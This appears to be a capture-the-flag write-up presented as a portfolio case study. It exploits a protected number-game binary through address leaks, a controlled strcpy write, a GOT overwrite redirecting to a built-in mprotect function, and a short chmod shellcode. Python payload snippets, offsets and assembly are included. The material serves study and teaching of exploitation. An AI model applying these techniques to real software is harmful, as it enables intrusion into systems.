# Advanced Memory Corruption: A Multi-Stage Binary Exploitation Case Study

## Executive Summary

This case study examines a sophisticated binary exploitation challenge that demonstrates the practical application of modern memory corruption techniques. The target binary implements a number-checking game with multiple security protections, requiring a carefully orchestrated multi-stage attack to achieve code execution. This research showcases the intersection of reverse engineering, exploit development, and creative problem-solving in offensive security.

**Key Skills Demonstrated:**
- Reverse engineering of protected binaries
- Multi-stage exploit development
- Memory layout analysis and manipulation
- Bypass techniques for modern security protections
- Position-independent shellcode development

## Target Analysis

### Binary Protections

The target binary implements several contemporary security mechanisms:

- **Position Independent Executable (PIE)**: Randomizes code segment addresses
- **Stack Canary**: Detects stack buffer overflows
- **NX (No-Execute)**: Prevents code execution on the stack
- **Partial RELRO**: Global Offset Table remains writable

This protection profile represents a realistic modern binary, requiring sophisticated exploitation techniques beyond simple buffer overflows.

### Vulnerability Discovery

Through careful reverse engineering, I identified a critical vulnerability in the input processing loop. The binary reads user input into a buffer and subsequently performs a string copy operation where both source and destination pointers can be controlled through a carefully crafted overflow:

```c
read(0, buffer + 4, 0x54);        // 84-byte read
strcpy(dest_ptr, src_ptr);        // Both pointers controllable
```

**Critical Insight**: While the initial overflow is size-limited (84 bytes), the ability to control both strcpy pointers creates a powerful arbitrary write primitive. This transforms a constrained overflow into a versatile exploitation tool.

### Memory Layout Analysis

Understanding the stack frame structure was essential for exploitation:

```
Offset from RBP    Variable           Purpose
-0x44              Input buffer       User-controlled data
-0x28              src_ptr            strcpy source pointer  
-0x20              dest_ptr           strcpy destination pointer
-0x10              Stack canary       Overflow detection
```

## Diagram 1: Memory Layout

```
┌─────────────────────────────────────────────────┐
│                    Higher Addresses              │
├─────────────────────────────────────────────────┤
│  RBP (Base Pointer)                             │
├─────────────────────────────────────────────────┤
│  ...                                            │
├─────────────────────────────────────────────────┤
│  RBP-0x10: Stack Canary          [PROTECTED]   │
│            ████████████████████                 │
├─────────────────────────────────────────────────┤
│  RBP-0x20: dest_ptr (local_20)   [CONTROLLABLE] │
│            ┌─────────────────┐                  │
│            │  strcpy dest    │                  │
│            └─────────────────┘                  │
├─────────────────────────────────────────────────┤
│  RBP-0x24: Loop Counter          [CONTROLLABLE] │
│            ┌─────────────────┐                  │
│            │  -11 (0xffffff5)│                  │
│            └─────────────────┘                  │
├─────────────────────────────────────────────────┤
│  RBP-0x28: src_ptr (local_28)    [CONTROLLABLE] │
│            ┌─────────────────┐                  │
│            │  strcpy source  │                  │
│            └─────────────────┘                  │
├─────────────────────────────────────────────────┤
│  RBP-0x44: Input Buffer (84 bytes max)          │
│            ┌─────────────────────────────────┐  │
│            │  User-controlled data region    │  │
│            │  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  │  │
│            └─────────────────────────────────┘  │
├─────────────────────────────────────────────────┤
│                    Lower Addresses               │
└─────────────────────────────────────────────────┘

Legend:
  [PROTECTED]    - Cannot overwrite without detection
  [CONTROLLABLE] - Reachable via 84-byte overflow
  ████           - Security protection
  ▓▓▓▓           - User input
```

The limited overflow distance (28 bytes to reach src_ptr) means we cannot directly overwrite the return address, but we can manipulate the strcpy operation to perform arbitrary memory writes.

---
## Exploitation Methodology

The solution employs a four-stage exploitation chain, with each stage building upon information and state from previous stages.

### Stage 1: Binary Base Address Disclosure

**Objective**: Defeat PIE by leaking a known address from the binary's data section.

The application echoes user input through a format string, creating an information disclosure vector. By overflowing to the src_ptr location and pointing it to a known data section address, I could leak the binary base:

```python
stage1_payload = b"A" * 24 + p32(0xfffffff5)
```

The negative value (0xfffffff5 = -11 when interpreted as signed) serves dual purposes:
1. Maintains the loop iteration to reach the desired execution path
2. Positions pointers for the next stage

When the binary echoes this input, it includes the dereferenced src_ptr value, revealing an address from the .bss section. This single leaked address defeats PIE completely, as all binary addresses can be calculated from the base.

### Stage 2: Stack Address Disclosure  

**Objective**: Obtain a stack address for precise pointer arithmetic.

With the binary base known, the next challenge was determining stack addresses for pointer calculations. The application's logic provided a convenient path: under certain conditions, it sets src_ptr to point to a stack-based variable.

```python
stage2_payload = b"B" * 24 + p32(0xfffffff5)
```

By controlling the loop counter to reach a specific code path, I forced the binary to place a stack address into src_ptr. When echoed, this revealed the exact stack location, enabling precise offset calculations for subsequent stages.

### Stage 3: Return Address Preparation

**Objective**: Position pointers to overwrite the function return address.

With both binary and stack addresses known, I could now perform precise memory writes. The third stage prepares for code execution by manipulating the return address:

```python
stage3_payload = b"C" * 16
stage3_payload += p64(stack_addr - 0xf)      # src_ptr: points to buffer address
stage3_payload += p32(0xfffffff5)            # loop counter
stage3_payload += p64(stack_addr)            # maintain src_ptr  
stage3_payload += p64(stack_addr + 0x34)     # dest_ptr: return address location
```

This payload configures the strcpy to write the buffer's address to the return address location. When the function returns, execution will redirect to our buffer—but we still need executable permissions.

### Stage 4: GOT Overwrite and Code Execution

**Objective**: Make the stack executable and run shellcode.

The NX protection prevents direct shellcode execution from the stack. However, I identified a built-in function in the binary:

```c
void mprotect_stack(void) {
    void *stack_page = (void*)((ulong)&local_var & 0xfffffffffffff000);
    mprotect(stack_page, 0x1000, 7);  // Set RWX permissions
}
```

This function, likely intended for debugging, makes stack pages executable. Rather than building a ROP chain to call mprotect from libc, I leveraged this existing function by overwriting a GOT entry:

```python
stage4_payload = shellcode
stage4_payload += b"D" * (16 - len(shellcode))
stage4_payload += p64(binary_base + mprotect_offset)    # src: mprotect_stack addr
stage4_payload += p32(0x0000000e)                       # final loop counter
stage4_payload += p64(stack_addr)                       # maintain src_ptr
stage4_payload += p64(binary_base + strcpy_got_offset)  # dest: strcpy@GOT
```

This final payload:
1. Places shellcode at the beginning of the buffer
2. Overwrites strcpy@GOT with the address of mprotect_stack
3. On the next strcpy call, mprotect_stack executes instead, making the stack executable
4. Execution continues to the shellcode in the buffer

### Shellcode Design

The shellcode performs a straightforward task—modifying file permissions to enable reading:

```asm
section .text
    global _start

_start:
    nop
    push 0x66           ; Push 'f' (filename on stack)
    mov rdi, rsp        ; RDI = pointer to filename
    mov si, 0x1ff       ; Mode 0777
    mov al, 90          ; chmod syscall number
    syscall
```

The shellcode is position-independent and compact (under 16 bytes), fitting within the constrained buffer space.

## Technical Deep Dive

### Offset Calculations

Precise offset calculations were crucial for reliability:

- **Binary base**: `leaked_addr - 0x4080`
- **mprotect_stack**: `binary_base + 0x1269` (or `leaked_addr - 0x2e17`)
- **strcpy@GOT**: `binary_base + 0x4020` (or `leaked_addr - 0x60`)

These offsets were determined through static analysis using tools like Ghidra and verified through dynamic debugging with GDB.

### Protection Bypass Summary

| Protection | Bypass Technique |
|------------|------------------|
| PIE | Information leak via format string disclosure |
| Stack Canary | Limited overflow never reaches canary location |
| NX | GOT overwrite to call built-in mprotect function |
| RELRO (Partial) | Writable GOT enables function pointer overwrite |

### Why This Approach Works

Several factors made this exploitation strategy successful:

1. **Controlled Pointers**: The ability to manipulate both strcpy arguments created an arbitrary write primitive
2. **Information Leakage**: The echo functionality provided necessary address leaks
3. **Built-in Primitives**: The mprotect_stack function eliminated the need for ROP chains
4. **Precise Calculations**: Mathematical relationships between addresses enabled reliable exploitation
5. **Multi-Stage Design**: Each stage built upon previous work, gradually escalating privileges

## Lessons and Insights

### Technical Takeaways

**Limited Overflows Can Be Powerful**: Even a constrained 84-byte overflow became a complete exploitation primitive through pointer manipulation. The limitation isn't the overflow size—it's the attacker's creativity in using what they can control.

**Information Leakage Is Critical**: Modern protections like PIE and ASLR are only effective when addresses remain secret. A single leaked pointer can compromise the entire address space randomization scheme.

**Built-in Functionality Matters**: The presence of mprotect_stack, likely a debugging artifact, dramatically simplified exploitation. Security-conscious development requires examining all included code, not just obvious attack surfaces.

**Multi-Stage Exploitation**: Complex protections require sophisticated, multi-step approaches. Each stage should accomplish a specific objective while setting up conditions for the next.

### Practical Applications

This research demonstrates skills directly applicable to:

- **Vulnerability Research**: Identifying and analyzing memory corruption vulnerabilities
- **Exploit Development**: Crafting reliable exploits against protected targets  
- **Red Team Operations**: Bypassing modern security controls in realistic scenarios
- **Security Assessment**: Understanding attacker techniques to improve defensive postures

### Development Process

This exploit required iterative development with extensive debugging:

1. **Static Analysis**: Reverse engineering with Ghidra to understand program logic
2. **Dynamic Analysis**: GDB debugging to observe runtime behavior and verify offsets
3. **Incremental Testing**: Validating each stage independently before chaining
4. **Offset Refinement**: Adjusting calculations based on observed memory layouts

## Conclusion

This case study demonstrates advanced binary exploitation techniques against a modern, protected target. The successful exploitation required combining multiple skills: reverse engineering, memory corruption, shellcode development, and systematic debugging.

The multi-stage approach—information leakage, pointer manipulation, GOT overwriting, and shellcode execution—showcases how individual techniques combine to defeat layered security protections. Each protection mechanism (PIE, canaries, NX) fell not through brute force, but through careful analysis and creative exploitation.

This research represents practical offensive security capabilities applicable to vulnerability research, penetration testing, and security tool development. The methodical approach and technical depth demonstrate readiness for professional work in offensive security roles.

---

**Research Tools Used**: Ghidra, GDB, pwntools, Python

**Skills Demonstrated**: Binary exploitation, reverse engineering, memory corruption, shellcode development, bypass techniques, systematic debugging
